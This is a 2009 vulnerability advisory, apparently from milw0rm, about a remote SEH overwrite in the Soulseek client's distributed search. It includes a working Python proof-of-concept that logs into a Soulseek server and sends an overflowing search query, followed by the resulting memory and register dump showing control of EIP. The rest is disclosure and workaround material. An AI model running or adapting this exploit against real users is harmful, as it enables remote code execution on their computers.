@@ -1,0 +1,145 @@
+=============================================
+- Release date: May 24th, 2009
+- Discovered by: Laurent Gaffié
+- Severity: critical
+=============================================
+
+I. VULNERABILITY
+-------------------------
+Soulseek 157 NS * & 156.* Remote Distributed Search Code Execution
+
+II. BACKGROUND
+-------------------------
+"Soulseek(tm) is a unique ad-free, spyware free, and just plain free file 
+sharing application.
+One of the things that makes Soulseek(tm) unique is our community and 
+community-related features.
+Based on peer-to-peer technology, virtual rooms allow you to meet people with
+the same interests, share information, and chat freely using real-time messages
+in public or private.
+Soulseek(tm), with its built-in people matching system, is a great way to make 
+new friends and expand your mind!"
+
+III. DESCRIPTION
+-------------------------
+Soulseek client allows distributed file search to one person, everyone, or in a 
+specific Soulseek IRC channel, allowing a user to find the files he wants, in 
+a dedicated channel, or with his contacts, or on the whole network.
+Unfortunatly this feature is vulnerable to a remote SEH overwrite to a specific
+user, or even to a whole Soulseek IRC channel.
+
+IV. PROOF OF CONCEPT
+-------------------------
+This proof of concept is made to prevent a S-K party, it is only build to 
+target the user "testt4321".
+
+To try this proof of concept, you would have to open a soulseek client and use
+the username:
+"testt4321"
+with the password:
+"12345678"
+And launch this code.
+If you want to change the username or target a whole channel, you would have 
+to reverse the protocol :)
+
+
+
+#!/usr/bin/python
+import struct
+import sys, socket 
+from time import *
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("208.76.170.50",2242))  # Change to Port 2240 for 156* branch
+
+buffer = "\x48\x00\x00\x00\x01\x00\x00\x00\x08\x00\x00\x00\x74\x65\x73\x74"
+buffer+= "\x34\x33\x32\x31\x08\x00\x00\x00\x31\x32\x33\x34\x35\x36\x37\x38"
+buffer+= "\xb5\x00\x00\x00\x20\x00\x00\x00\x38\x65\x39\x31\x66\x37\x33\x30"
+buffer+= "\x35\x35\x37\x31\x32\x35\x64\x37\x34\x39\x32\x34\x62\x64\x66\x35"
+buffer+= "\x63\x32\x39\x61\x36\x37\x64\x61\x01\x00\x00\x00"
+
+s.send(buffer)
+sleep(1) 
+
+junk = "\x41" * 3084
+next_seh = struct.pack('<L', 0x42424242)
+seh =      struct.pack('<L', 0x43434343)
+other_junk = "\x61" * 1423
+
+buffer2 = "\x01\x0f\x00\x00\x2a\x00\x00\x00\x09\x00\x00\x00\x74\x65\x73\x74"
+buffer2+= "\x74\x34\x33\x32\x31\xa4\x5a\x51\x44\xe8\x0e\x00\x00"+junk+next_seh+seh+other_junk
+s.send(buffer2)
+sleep(1)
+s.recv(1024)
+
+
+
+After the query is send, the memory will look like this
+0012FBE4   41414141
+0012FBE8   42424242  Pointer to next SEH record
+0012FBEC   43434343  SE handler
+0012FBF0   61616161
+
+And the program will terminate with this structure:
+EAX 00000000
+ECX 43434343
+EDX 7C9132BC ntdll.7C9132BC
+EBX 00000000
+ESP 0012EA78
+EBP 0012EA98
+ESI 00000000
+EDI 00000000
+EIP 43434343
+
+
+V. BUSINESS IMPACT
+-------------------------
+An attacker could exploit this vulnerability to compromise any Soulseek client connected to
+the Soulseek network.
+
+VI. SYSTEMS AFFECTED
+-------------------------
+Windows all versions
+
+VII. SOLUTION
+-------------------------
+A fast solution would be to use Nicotine-Plus (http://nicotine-plus.sourceforge.net/) 
+a Python Soulseek client.
+Another quick workaround at server level would be to limit the search query lenght.
+
+VIII. REFERENCES
+-------------------------
+http://www.slsknet.org
+
+IX. CREDITS
+-------------------------
+This vulnerability has been discovered by Laurent Gaffié
+Laurent.gaffie{remove-this}(at)gmail.com
+
+
+X. REVISION HISTORY
+-------------------------
+May 24, 2009: Initial release
+
+
+XI. DISCLOSURE TIMELINE
+-------------------------
+july      29, 2008: Bug discovered
+September 03, 2008: Vendor contacted; no response.
+October   14, 2008: Vendor contacted; still no response.
+April     12, 2009: Idefense contacted.
+April     13, 2009: Idefense answered.
+April     23, 2009: Advisory send to idefense contributor program.
+May       13, 2009: Idefense contacted, bug rejected (no reason given)
+May       15, 2009: Idefense recontacted; no answer.
+May       16, 2009: Last try to contact Soulseek maintainers
+May       24, 2009: Advisory published.
+
+XII. LEGAL NOTICES
+-------------------------
+The information contained within this advisory is supplied "as-is"
+with no warranties or guarantees of fitness of use or otherwise.
+I accept no responsibility for any damage caused by the use or 
+misuse of this information.
+
+# milw0rm.com [2009-05-26]
